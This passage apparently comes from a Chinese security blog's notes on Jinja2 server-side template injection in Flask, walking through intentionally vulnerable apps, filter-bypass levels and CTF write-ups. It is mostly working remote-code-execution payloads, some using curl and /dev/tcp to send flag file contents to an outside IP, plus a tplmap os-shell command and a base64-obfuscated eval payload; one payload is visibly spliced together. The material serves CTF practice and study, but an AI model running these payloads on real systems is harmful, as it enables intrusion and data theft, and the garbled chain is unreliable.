<span class="hljs-string">            &lt;h3&gt;%s&lt;/h3&gt;</span>
<span class="hljs-string">        &lt;/div&gt; </span>
<span class="hljs-string">        </span>
<span class="hljs-string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="hljs-string">&#x27;k&#x27;</span>))

    <span class="hljs-keyword">return</span> render_template_string(template)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    app.debug = <span class="hljs-literal">True</span>
    app.run()</code></pre></div>

这部分为简单的测试，k参数直接拼接进入模板。在实际利用时，我们可以更加高大上一些，直接拼接多个模板，同时进行注入。



### 常规payload

<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/test?k=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/mytest1337.py&#x27;,&#x27;w&#x27;).write(request.headers[&#x27;X-Payload&#x27;])&#125;&#125;-&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/mytest1337.py&#x27;).read()&#125;&#125;-&#123;&#123;config.from_pyfile(&#x27;/tmp/mytest1337.py&#x27;)&#125;&#125;</span> <span class="hljs-meta">HTTP/1.1</span>

<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.133.180:5000

<span class="hljs-attribute">X-Payload</span><span class="hljs-punctuation">: </span>import os;a=os.system(&quot;cat /flag &gt; /tmp/mytest1337.log&quot;);os.system(&quot;curl http://129.211.9.7:9999/&#123;&#125;&quot;.format(open(&quot;/tmp/mytest1337.log&quot;).read().encode(&quot;hex&quot;)))

<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0

<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate

<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close

<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1

<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache

<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache
</code></pre></div>



## **简单测试过滤**

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, request
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)
    <span class="hljs-built_in">print</span> exploit

    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)
    print(rendered_template)

    <span class="hljs-keyword">return</span> render_template_string(rendered_template)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div>









### level 1 过滤`_`

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, request
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)
    <span class="hljs-built_in">print</span> exploit

    blacklist = [<span class="hljs-string">&quot;__class__&quot;</span>]
    <span class="hljs-comment"># Level 1</span>
    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:
        <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> exploit:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>

    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)
    print(rendered_template)

    <span class="hljs-keyword">return</span> render_template_string(rendered_template)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;test?k&#x3D;&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param&#x3D;__class__</code></pre></div>



### level 2 过滤`_、request[request.`

<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span>
<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, request
app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)
    <span class="hljs-built_in">print</span> exploit

    blacklist = [<span class="hljs-string">&quot;__class__&quot;</span>, <span class="hljs-string">&quot;request[request.&quot;</span>]
    blacklist += [<span class="hljs-string">&quot;__&quot;</span>]

    <span class="hljs-comment"># Level 1</span>
    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:
        <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> exploit:
            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>
    <span class="hljs-comment"># Level 2</span>
    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:
        <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> request.args:
            <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> request.args[param]:
                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>

    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)
    print(rendered_template)

    <span class="hljs-keyword">return</span> render_template_string(rendered_template)

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div>



上面的payload无法使用了,可以使用join进行字符串拼接

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>



### level3 过滤了`[]、_、request[request.`

join支持元组

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>



但是，它有点丑陋且很长。使用该`.getlist()`函数，我们可以将其缩短一点：

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l&#x3D;a&amp;a&#x3D;_&amp;a&#x3D;_&amp;a&#x3D;class&amp;a&#x3D;_&amp;a&#x3D;_</code></pre></div>





### level 4 过滤了 `join`

<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f&#x3D;%s%sclass%s%s&amp;a&#x3D;_</code></pre></div>



### **level5 最终payload**

首先是需要绕过获取object时使用的`[]`这里过滤了`_`，所以没法使用`__getitem__()`。但是我们可以使用jinja2的控制语句`&#123;%%&#125;</code>set 命令来获取第八个元素，这里使用a-i获取前九个元素，i即获取到第八个元素。也就是对应着我们的利用链。</li>
</ul>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;%set a,b,c,d,e,f,g,h,i%20&#x3D;%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;print+1337</code></pre></div>

<p>但是这样的payload无法绕过<code>_</code></p>
<p><strong>最终payload：</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;%set%20a,b,c,d,e,f,g,h,i%20&#x3D;%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class&#x3D;class&amp;mro&#x3D;mro&amp;subc&#x3D;subclasses&amp;usc&#x3D;_&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;print+1337</code></pre></div>



<p><strong>注意：</strong></p>
<p>环境的不同会导致获取object的序号不同，我本地的object为第10号元素，所以我需要赋值给11个变量：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%%20set%20a,b,c,d,e,f,g,h,i,j,k%20&#x3D;%20request.__class__.__mro__%&#125;</code></pre></div>

<p>不然会报错，真实场景下存在waf如果无法直接查看序号，可以多次尝试，正常返回200即运行正确。</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%set%20a,b,c,d,e,f,g,h,i,j,k%20&#x3D;%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(k|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class&#x3D;class&amp;mro&#x3D;mro&amp;subc&#x3D;subclasses&amp;usc&#x3D;_&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;import+os;a&#x3D;os.system(&quot;cat+&#x2F;flag+&gt;+&#x2F;tmp&#x2F;mytest1337.log&quot;);os.system(&quot;curl+http:&#x2F;&#x2F;129.211.9.7:9999&#x2F;&#123;&#125;&quot;.format(open(&quot;&#x2F;tmp&#x2F;mytest1337.log&quot;).read().encode(&quot;hex&quot;)))</code></pre></div>

<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201001114304261.png" alt="image-20201001114304261"></p>
<h3 id="更多payload转换练习"><a href="#更多payload转换练习" class="headerlink" title="更多payload转换练习"></a>更多payload转换练习</h3><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;&#x2F;bin&#x2F;bash -c \&quot;cat &#x2F;flag &gt; &#x2F;dev&#x2F;tcp&#x2F;129.211.9.7&#x2F;9999\&quot;&quot;)&#39;)&#125;&#125;</code></pre></div>

<p>对应：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(%22os%22).system(%22&#x2F;bin&#x2F;bash+-c+\%22cat+&#x2F;flag+%3E+&#x2F;dev&#x2F;tcp&#x2F;129.211.9.7&#x2F;9999\%22%22)</code></pre></div>







<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;

对应

http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)|attr(request.args.x10)(request.args.x11)|attr(request.args.x12)()&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;__import__&amp;x9&#x3D;os&amp;x10&#x3D;popen&amp;x11&#x3D;whoami&amp;x12&#x3D;read</code></pre></div>



<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__base__.__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#125;


&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)()|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)(request.args.x8)|attr(request.args.x9)(request.args.x10)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;_module&amp;x6&#x3D;__builtins__&amp;x7&#x3D;__import__&amp;x8&#x3D;os&amp;x9&#x3D;system&amp;x10&#x3D;whoami(59)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;</code></pre></div>





<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># linecache利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)

<span class="hljs-comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;platform&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()

<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;hello&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;execfile&#x27;</span>](<span class="hljs-string">&#x27;E:/exp.py&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)
exec(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;compile&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>))

<span class="hljs-comment"># sys利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()

<span class="hljs-comment"># types利用，后面还是通过__builtins__实现利用</span>
<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;types&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div>



<p>字典用<code>|attr(__getitem__(request.args.x??))</code></p>
<h2 id="逃逸1"><a href="#逃逸1" class="headerlink" title="逃逸1"></a>逃逸1</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function

banned = [
    <span class="hljs-string">&quot;import&quot;</span>,
    <span class="hljs-string">&quot;exec&quot;</span>,
    <span class="hljs-string">&quot;eval&quot;</span>,
    <span class="hljs-string">&quot;pickle&quot;</span>,
    <span class="hljs-string">&quot;os&quot;</span>,
    <span class="hljs-string">&quot;subprocess&quot;</span>,
    <span class="hljs-string">&quot;kevin sucks&quot;</span>,
    <span class="hljs-string">&quot;input&quot;</span>,
    <span class="hljs-string">&quot;banned&quot;</span>,
    <span class="hljs-string">&quot;cry sum more&quot;</span>,
    <span class="hljs-string">&quot;sys&quot;</span>
]

targets = __builtins__.__dict__.keys()
targets.remove(<span class="hljs-string">&#x27;raw_input&#x27;</span>)
targets.remove(<span class="hljs-string">&#x27;print&#x27;</span>)
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:
    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]

<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
    print(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)
    data = raw_input()

    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:
        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():
            print(<span class="hljs-string">&quot;No bueno&quot;</span>)
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># this means nobreak</span>
        <span class="hljs-built_in">exec</span> data</code></pre></div>







<h2 id="SSTI1-巅峰极客2020"><a href="#SSTI1-巅峰极客2020" class="headerlink" title="SSTI1 巅峰极客2020"></a>SSTI1 巅峰极客2020</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat &#x2F;flag&#39;)|attr(&#39;read&#39;)()&#125;&#125;</code></pre></div>



<p>过滤<code>|join、_、[]</code>等可以采用的方式</p>
<p>payload原型为：</p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;

&#123;&#123;request[&#39;application&#39;][&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div>







<h2 id="buuctf-fake-google"><a href="#buuctf-fake-google" class="headerlink" title="buuctf fake google"></a>buuctf fake google</h2><div class="hljs code-wrapper"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div>

<p>得到Flag：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/5592bae9d0e9df9ea83c14fde0b48873a20.png" alt="img"></p>
<p>除此之外第二种更简单的解法就是用tplmap工具直接GetShell。</p>
<p>python tplmap.py -u <a target="_blank" rel="noopener" href="http://078120db-2672-4fc5-b3a9-87e76e4d9773.node3.buuoj.cn/qaq?name=">http://078120db-2672-4fc5-b3a9-87e76e4d9773.node3.buuoj.cn/qaq?name=</a> –os-shell</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7f153f9a4b2c99751f45462885bf36a3981.png" alt="img"></p>
<p>然后cat /flag也可以得到Flag：</p>
<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/473884af2001ff2b566de9675ee59e8380a.png" alt="img"></p>
<p><strong>tplmap 的payload</strong></p>
<div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;7251761135&#125;&#125;&#123;&#123;&#39;&#39;&#125;&#125;&#123;% set d &#x3D; &quot;eval(__import__(&#39;base64&#39;).urlsafe_b64decode(&#39;X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYkhNPScpLmRlY29kZSgpKS5yZWFkKCk&#x3D;&#39;))&quot; %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;
&#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;
&#123;% if &#39;eval&#39; in b.keys() %&#125;
&#123;&#123; b[&#39;eval&#39;](d) &#125;&#125;
&#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;
&#123;% endif %&#125; &#123;% endfor %&#125;&#123;&#123;&#39;&#39;&#125;&#125;&#123;&#123;6201548481&#125;&#125;</code></pre></div>





<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="WesternCTF2018 shrine"></a>WesternCTF2018 shrine</h2><p>题目源码</p>
<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask
<span class="hljs-keyword">import</span> os

app = flask.Flask(__name__)

app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span>(<span class="hljs-params">shrine</span>):</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span>
        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) 
        + s

    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    app.run(debug=<span class="hljs-literal">True</span>)
</code></pre></div>



<p>读取flag需要查看config对象，但是config对象在黑名单中</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)</code></pre></div>

<p>我们可以通过别的方式获取到config对象</p>
<div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;self.__dict__&#125;&#125;
